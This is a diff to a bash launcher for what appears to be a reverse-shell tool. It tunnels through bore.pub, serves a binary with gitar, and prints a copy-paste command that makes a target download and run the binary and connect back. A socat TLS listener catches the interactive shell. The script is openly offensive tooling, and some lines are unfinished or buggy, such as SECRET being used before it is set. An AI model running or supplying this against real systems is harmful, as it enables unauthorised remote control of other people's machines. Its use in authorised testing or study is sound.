@@ -8,19 +8,15 @@ for i in "$@"; do
         LPORT="$2"
         shift;shift;
         ;;
-    --lhost)
-        LHOST="$2"
-        shift;shift;
-        ;;
     --webport)
         WEBPORT="$2"
         shift;shift;
-        ;;        
-    --gitar|-g)
-        GITAR=true
         ;;
     --windows|-w)
         WINDOWS=true
+        ;;
+    --help|-h)
+        HELP=true
         ;;
     *)    
         ;;
@@ -28,20 +24,23 @@ for i in "$@"; do
 done
 
 # Default value + envvar
-
 SCRIPTNAME=$(readlink -f "$0")
 BASEDIR=$(dirname "$SCRIPTNAME")
 
 
-if [[ -z "$WEBPORT" ]];
+if [[ -z "$LPORT" ]];
 then
-    WEBPORT=8080
+    LPORT=4444
 fi
 
-if [[ -z "$LHOST" ]] || [[ -z "$LPORT" ]];
+if [[ -z "$WEBPORT" ]];
 then
-    echo "Usage : $0 --lhost <LHOST> --lport <LPORT> --webport <WEB_PORT>"
-    echo "to preload gitar shortcuts within reverse shell: $0 --lhost <LHOST> --lport <LPORT> --gitar"
+    WEBPORT=9292
+fi
+
+if [[ "$HELP" ]];
+then
+    echo "Usage : $0 -p <socat_port>"
     exit 92
 fi
 
@@ -70,21 +69,27 @@ fi
 
 cp ${SCRIPT}.tpl ${SCRIPT}
 
-# HTTP server launch
-if [[ "$GITAR" ]]; then
-    #gitar shortcut is not available with windows
-    if [[ ! $WINDOWS ]]; then
-        echo "[+] gitar shortcuts enabled on reverse shell"
-        sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
-        sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
-    fi
-    echo "[+] launch gitar server"
-    SECRET=$RANDOM
-    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret ${SECRET}"
-else
-    echo "[+] gitar shortcuts  not enabled"
-    tmux split-window -h "python3 -m http.server ${WEBPORT}"
+
+# launch bore
+TEAL='\033[1;36m'
+NC='\033[0m' # No Color
+echo "[+] Launch bore tunneling"
+tmux split-window -v "bore local 9292 --to bore.pub" #TODO: 9292 port as a flag
+printf "${TEAL}please enter bore.pub remote_port given? ${NC}"
+read BPORT
+BENDPOINT="bore.pub:${BPORT}"
+URL="http://${BENDPOINT}/${SECRET}"
+
+#gitar shortcut + launch gitar
+if [[ ! $WINDOWS ]]; then
+    echo "[+] gitar shortcuts enabled on reverse shell"
+    sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
+    sed -i "s/GITAR_HOST/${URL}/g" ${SCRIPT}  #Fix, I need -a and not -e
 fi
+echo "[+] launch gitar server"
+SECRET=$RANDOM
+tmux split-window -h "gitar -a https://${BENDPOINT} -f ${LPORT} --secret ${SECRET}"
+
 
 # put tacos in current directory
 PWD=$(pwd)
@@ -97,22 +102,19 @@ else
 
 fi
 
-# Message/output
+# message/output
 echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
-DOWNLOAD_URL=""
-if [[ "$GITAR" ]]; then
-    DOWNLOAD_URL="http://${LHOST}:${WEBPORT}/${SECRET}/pull/${BINARY}"
-else
-    DOWNLOAD_URL="${LHOST}:${WEBPORT}/${BINARY}"
-fi
+
+DOWNLOAD_URL="${URL}/pull/${BINARY}"
+SHUTDOWN_URL="${URL}/shutdown"
 
 
 # LISTEN
 echo
 if [[ "$WINDOWS" ]]; then
-    echo "(🪟) curl -O $DOWNLOAD_URL && .\\${BINARY} ${LHOST}:${LPORT}"
+    echo "(🪟) curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${BENDPOINT}"
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
 else
-    echo "(🐧) curl -O $DOWNLOAD_URL && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    echo "(🐧) curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${BENDPOINT}"
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
 fi
